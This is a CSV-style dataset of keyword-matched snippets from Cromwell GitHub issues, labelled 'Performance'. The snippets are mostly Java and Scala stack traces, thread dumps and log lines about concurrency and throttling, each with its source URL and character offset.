cromwell-system-akka.dispatchers.engine-dispatcher-28 INFO - CallCacheWriteActor configured to flush with batch size 100 and process rate 3 seconds.; 2019-07-21 23:34:38,667 cromwell-system-akka.dispatchers.engine-dispatcher-28 INFO - JobExecutionTokenDispenser - Distribution rate: 50 per 1 seconds.; 2019-07-21 23:34:39,131 cromwell-system-akka.dispatchers.backend-dispatcher-36 INFO - Running with 3 PAPI request workers; 2019-07-21 23:34:39,132 cromwell-system-akka.dispatchers.backend-dispatcher-36 INFO - PAPI request worker batch interval is 33333 milliseconds; 2019-07-21 23:34:39,157 cromwell-sys",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5084:2268,throttle,throttle,2268,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5084,1,['throttle'],['throttle']
Performance, Unable to create actor for ActorRef Actor[akka://; cromwell-system/user/SingleWorkflowRunnerActor/ServiceRegistryActor/KeyValue#988818050]; java.lang.RuntimeException: Unable to create actor for ActorRef Actor[akka://cromwell-system/user/SingleWorkflowRunnerActor/ServiceRegistryActor/KeyValue#988818050]; at cromwell.server.CromwellRootActor$$anonfun$1.applyOrElse(CromwellRootActor.scala:81); at cromwell.server.CromwellRootActor$$anonfun$1.applyOrElse(CromwellRootActor.scala:80); at akka.actor.SupervisorStrategy.handleFailure(FaultHandling.scala:295); at akka.actor.dungeon.FaultHandling$class.handleFailure(FaultHandling.scala:263); at akka.actor.ActorCell.handleFailure(ActorCell.scala:374); at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:459); at akka.actor.ActorCell.systemInvoke(ActorCell.scala:483); at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:282); at akka.dispatch.Mailbox.run(Mailbox.scala:223); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: java.lang.reflect.InvocationTargetException; at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method); at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62); at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45); at java.lang.reflect.Constructor.newInstance(Constructor.java:423); at akka.util.Reflect$.instantiate(Reflect.scala:65); at akka.actor.ArgsReflectConstructor.produce(IndirectActorProducer.scala:96); at akka.actor.Props.newActor(Props.scala:213); at akka.actor.ActorCell.newActor(ActorCell.scala:562); at akka.actor.ActorCell.create(ActorCell.scala:588); at akka.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1748#issuecomment-265155974:1175,concurren,concurrent,1175,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1748#issuecomment-265155974,1,['concurren'],['concurrent']
Performance," WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-10"" #70 prio=5 os_prio=31 tid=0x00007fb76bac5800 nid=0xb503 waiting on condition [0x0000000132fa6000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-9"" #69 prio=5 os_prio=31 tid=0x00007fb76f36d800 nid=0xb303 waiting on condition [0x000000012c1b6000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:17",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:10408,concurren,concurrent,10408,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance," WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-11"" #71 prio=5 os_prio=31 tid=0x00007fb76b05a800 nid=0xb703 waiting on condition [0x00000001331c9000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-10"" #70 prio=5 os_prio=31 tid=0x00007fb76bac5800 nid=0xb503 waiting on condition [0x0000000132fa6000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:1",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:9529,concurren,concurrent,9529,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance," WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-12"" #72 prio=5 os_prio=31 tid=0x00007fb76f1b0800 nid=0xb903 waiting on condition [0x00000001332cc000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-11"" #71 prio=5 os_prio=31 tid=0x00007fb76b05a800 nid=0xb703 waiting on condition [0x00000001331c9000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:1",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:8650,concurren,concurrent,8650,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance," WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-13"" #73 prio=5 os_prio=31 tid=0x00007fb76a458800 nid=0xbb03 waiting on condition [0x0000000133591000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-12"" #72 prio=5 os_prio=31 tid=0x00007fb76f1b0800 nid=0xb903 waiting on condition [0x00000001332cc000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:1",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:7771,concurren,concurrent,7771,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance," WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-14"" #74 prio=5 os_prio=31 tid=0x00007fb76dd8e800 nid=0xbd03 waiting on condition [0x0000000133694000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-13"" #73 prio=5 os_prio=31 tid=0x00007fb76a458800 nid=0xbb03 waiting on condition [0x0000000133591000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:1",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:6892,concurren,concurrent,6892,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance," WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-15"" #75 prio=5 os_prio=31 tid=0x00007fb76e11d000 nid=0xbf03 waiting on condition [0x0000000133797000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-14"" #74 prio=5 os_prio=31 tid=0x00007fb76dd8e800 nid=0xbd03 waiting on condition [0x0000000133694000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:1",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:6013,concurren,concurrent,6013,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance," WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-16"" #77 prio=5 os_prio=31 tid=0x00007fb76a6e9800 nid=0xc303 waiting on condition [0x000000013399d000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-15"" #75 prio=5 os_prio=31 tid=0x00007fb76e11d000 nid=0xbf03 waiting on condition [0x0000000133797000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:1",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:5134,concurren,concurrent,5134,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance," WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-17"" #78 prio=5 os_prio=31 tid=0x00007fb76de1b800 nid=0xc503 waiting on condition [0x0000000133df7000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-16"" #77 prio=5 os_prio=31 tid=0x00007fb76a6e9800 nid=0xc303 waiting on condition [0x000000013399d000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:1",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:4255,concurren,concurrent,4255,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance," WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-18"" #79 prio=5 os_prio=31 tid=0x00007fb76d1d1000 nid=0xc703 waiting on condition [0x0000000133f90000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-17"" #78 prio=5 os_prio=31 tid=0x00007fb76de1b800 nid=0xc503 waiting on condition [0x0000000133df7000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:1",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:3376,concurren,concurrent,3376,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance," WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-19"" #80 prio=5 os_prio=31 tid=0x00007fb76cc59800 nid=0xc903 waiting on condition [0x0000000134093000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-18"" #79 prio=5 os_prio=31 tid=0x00007fb76d1d1000 nid=0xc703 waiting on condition [0x0000000133f90000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:1",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:2497,concurren,concurrent,2497,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance," [info] org.scalatest.exceptions.TableDrivenPropertyCheckFailedException:; 14:08:29 cromwell-test_1 | [info] ...; 14:08:29 cromwell-test_1 | [info] at cromwell.backend.sfs.SharedFileSystemJobExecutionActorSpec.localizationSpec(SharedFileSystemJobExecutionActorSpec.scala:119); 14:08:29 cromwell-test_1 | [info] at cromwell.backend.sfs.SharedFileSystemJobExecutionActorSpec.$anonfun$new$4(SharedFileSystemJobExecutionActorSpec.scala:156); 14:08:29 cromwell-test_1 | [info] at org.scalatest.OutcomeOf.outcomeOf(OutcomeOf.scala:85); 14:08:29 cromwell-test_1 | [info] at org.scalatest.OutcomeOf.outcomeOf$(OutcomeOf.scala:83); 14:08:29 cromwell-test_1 | [info] at org.scalatest.OutcomeOf$.outcomeOf(OutcomeOf.scala:104); 14:08:29 cromwell-test_1 | [info] at org.scalatest.Transformer.apply(Transformer.scala:22); 14:08:29 cromwell-test_1 | [info] at org.scalatest.Transformer.apply(Transformer.scala:20); 14:08:29 cromwell-test_1 | [info] ...; 14:08:29 cromwell-test_1 | [info] Cause: org.scalatest.concurrent.Futures$FutureConcept$$anon$1: A timeout occurred waiting for a future to complete. Queried 21 times, sleeping 500 milliseconds between each query.; 14:08:29 cromwell-test_1 | [info] ...; 14:08:29 cromwell-test_1 | [info] at cromwell.backend.sfs.SharedFileSystemJobExecutionActorSpec.$anonfun$localizationSpec$1(SharedFileSystemJobExecutionActorSpec.scala:137); 14:08:29 cromwell-test_1 | [info] at cromwell.backend.sfs.SharedFileSystemJobExecutionActorSpec.$anonfun$localizationSpec$1$adapted(SharedFileSystemJobExecutionActorSpec.scala:119); 14:08:30 cromwell-test_1 | [info] at org.scalatest.enablers.UnitTableAsserting$TableAssertingImpl.$anonfun$forAll$7(TableAsserting.scala:505); 14:08:30 cromwell-test_1 | [info] at scala.collection.TraversableLike$WithFilter.$anonfun$foreach$1(TraversableLike.scala:789); 14:08:30 cromwell-test_1 | [info] at scala.collection.immutable.List.foreach(List.scala:389); 14:08:30 cromwell-test_1 | [info] at scala.collection.TraversableLike$WithFilter.forea",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4319:2168,concurren,concurrent,2168,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4319,1,['concurren'],['concurrent']
Performance," ```; Exception in thread ""main"" java.lang.UnsupportedClassVersionError: org/hsqldb/jdbcDriver has been compiled by a more recent version of the Java Runtime (class file version 55.0), this version of the Java Runtime only recognizes class file versions up to 52.0; 	at java.lang.ClassLoader.defineClass1(Native Method); 	at java.lang.ClassLoader.defineClass(ClassLoader.java:763); 	at java.security.SecureClassLoader.defineClass(SecureClassLoader.java:142); 	at java.net.URLClassLoader.defineClass(URLClassLoader.java:467); 	at java.net.URLClassLoader.access$100(URLClassLoader.java:73); 	at java.net.URLClassLoader$1.run(URLClassLoader.java:368); 	at java.net.URLClassLoader$1.run(URLClassLoader.java:362); 	at java.security.AccessController.doPrivileged(Native Method); 	at java.net.URLClassLoader.findClass(URLClassLoader.java:361); 	at java.lang.ClassLoader.loadClass(ClassLoader.java:424); 	at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:349); 	at java.lang.ClassLoader.loadClass(ClassLoader.java:357); 	at com.zaxxer.hikari.HikariConfig.attemptFromContextLoader(HikariConfig.java:970); 	at com.zaxxer.hikari.HikariConfig.setDriverClassName(HikariConfig.java:480); 	at slick.jdbc.hikaricp.HikariCPJdbcDataSource$.$anonfun$forConfig$3(HikariCPJdbcDataSource.scala:33); 	at slick.jdbc.hikaricp.HikariCPJdbcDataSource$.$anonfun$forConfig$3$adapted(HikariCPJdbcDataSource.scala:33); 	at scala.Option.foreach(Option.scala:437); 	at slick.jdbc.hikaricp.HikariCPJdbcDataSource$.forConfig(HikariCPJdbcDataSource.scala:33); 	at slick.jdbc.hikaricp.HikariCPJdbcDataSource$.forConfig(HikariCPJdbcDataSource.scala:21); 	at slick.jdbc.JdbcDataSource$.forConfig(JdbcDataSource.scala:47); 	at slick.jdbc.JdbcBackend$DatabaseFactoryDef.forConfig(JdbcBackend.scala:341); 	at slick.jdbc.JdbcBackend$DatabaseFactoryDef.forConfig$(JdbcBackend.scala:337); 	at slick.jdbc.JdbcBackend$$anon$1.forConfig(JdbcBackend.scala:32); 	at 